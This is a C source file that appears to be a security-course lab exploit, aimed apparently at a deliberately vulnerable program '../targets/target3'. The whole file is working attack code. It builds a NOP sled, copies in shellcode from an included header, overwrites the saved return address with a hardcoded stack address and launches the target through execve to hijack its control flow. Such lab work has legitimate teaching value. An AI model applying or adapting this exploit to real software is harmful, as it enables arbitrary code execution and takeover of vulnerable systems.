#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define BUFFER_SIZE 80
#define NOP 0x90
#define TARGET_ADDRESS 0x40a4fe10
/*
 *	&buf 	       = 0x40a4fe10
 *	rip(foo)       = 0x40a4fe58
 *	return address = 0x40a4fe10
 *
 *  attack buffer  = [NOP][Shellcode][Return Address]
 */
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	
	char buff[BUFFER_SIZE];
	
	int i;
	for (i = 0; i < BUFFER_SIZE; i++)
	{
		buff[i] = NOP;
	}
	
	char *ptr = buff + 5;
	for (i = 0; i < strlen(shellcode); i++)
    {
        ptr[i] = shellcode[i];
    }
	
    // 0x40a4fe58 - 0x40a4fe10 = 0x48(72)
	// 72 - strlen("ECE56820") = 64
    *(int *) & buff[64] = TARGET_ADDRESS;
    buff[68] = '\x00';
        
	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}